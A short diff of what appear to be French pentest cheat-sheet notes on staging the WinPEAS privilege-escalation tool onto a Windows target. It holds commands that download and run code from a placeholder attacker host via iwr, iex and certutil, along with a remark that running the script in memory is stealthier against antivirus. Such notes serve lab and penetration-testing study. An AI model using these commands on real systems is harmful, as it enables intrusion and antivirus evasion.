@@ -12,7 +12,7 @@ iwr -uri http://<ip_hacker>/winpeas.exe -OutFile winpeas.exe
 
 iex (iwr -UseBasicParsing http://<ip_hacker>/run_peas.ps1) <- plus discret pour les AV car lancer le script en memoir avec iex au lieu décrire un exe sur le disque  
 
-certutil.exe -urlcache -f http://ip_hacker/winpeas.exe winpeas.exe
+certutil.exe -urlcache -f http://ip_hacker/winpeas.exe winpeas.exe (cmd pas pwsh)
 
 ==================================================================
 
